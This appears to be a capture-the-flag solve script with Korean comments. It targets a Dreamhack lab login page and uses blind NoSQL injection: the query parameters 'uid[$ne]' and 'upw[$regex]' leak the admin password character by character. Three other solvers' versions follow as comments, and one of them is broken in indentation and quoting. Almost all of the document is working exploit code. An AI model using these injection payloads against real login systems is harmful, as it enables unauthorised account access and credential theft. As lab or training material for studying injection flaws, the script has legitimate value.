# HTTP/1.1 request를 보낼 수 있게 하는 Library
import requests 
# 문자열과 관련된 library
import string 

# 정규표현식은 안에 같은 패턴의 문자열이 존재하는지 패턴을 알아 내는 것이다.
# 즉 무조건 DH로 시작하지 않아도 된다는 뜻이다.
# DH는 필터링 되므로 {나 H로 upw를 알아내기 위해 패턴 비교를 시작해도 된다.
flag = '{'

# string.ascii_letters = 소문자 + 대문자 알파벳, string.digits = 숫자
pattern = string.ascii_letters + string.digits

URL = "http://host1.dreamhack.games:17214/login" # http request를 보낼 url

# payload = "?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=dreamhack&upw[$regexp]="
# r = requests.get(url = URL + payload)

# request의 reponse를 text형태로 return 
def response(upw) :
    # query parameter 
    # {'uid[$ne]':'guest', 'upw[$regex]': upw} == ?uid[$ne]=guest&upw[$regex]=upw
    PARAMS = {'uid[$ne]':'guest', 'upw[$regex]': upw} 
    r = requests.get(url = URL, params = PARAMS)
    return r.text

# find right char for upw
def getUpwC() :
    for c in pattern :
        temp = flag + c
        if 'admin' in response(temp) :
            return c

for i in range(32) :
    flag += getUpwC()
    print(f'DH{flag}')

print(f'DH{flag}}}')

# 다른 사람 코드 답 
# import requests
# import string
 
# url = "http://host1.dreamhack.games:17214/login"
# s = string.digits + string.ascii_uppercase + string.ascii_lowercase + "{}"
 
# result = ""
# for i in range(32):
#     for idx, c in enumerate(s):
#         payload = "?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]={" + (result+c)
#         res = requests.get(url+payload)
        
#         if res.text.find("admin") != -1:
#             result += s[idx]
#             print(result)
#             break
 
# flag = "DH" + result + "}"
 
# print(flag)



# import requests
# import string

# target = "http://host1.dreamhack.games:19078/login?"
# payload = target
# payload += “uid[$regex]=^adm&upw[$regex]=d*{”
# alphanumeric = string.digits + string.ascii_letters

# flag = ‘’

# for c in range(32):
# for i in alphanumeric:
# res = requests.get(payload + flag + i)
# if res.text == “admin”:
# flag += i
# print(c, "th ", "subflag is: ", flag)
# break

# print(res.text)


# import requests
# import string

# URL = "http://host1.dreamhack.games:18598/login"

# result = ""

# l = '{' + '}'  + string.digits + string.ascii_lowercase

# is_running = True
# while is_running:
#     for i in l:
#         res = requests.get(URL, params={
#             'uid[$regex]': 'adm',
#             'upw[$regex]': result + i
#         })
#         if 'admin' in res.text:
#             result += i
#             print(result)
#             break
#         if i == l[-1]:
#             is_running = False

# print(result)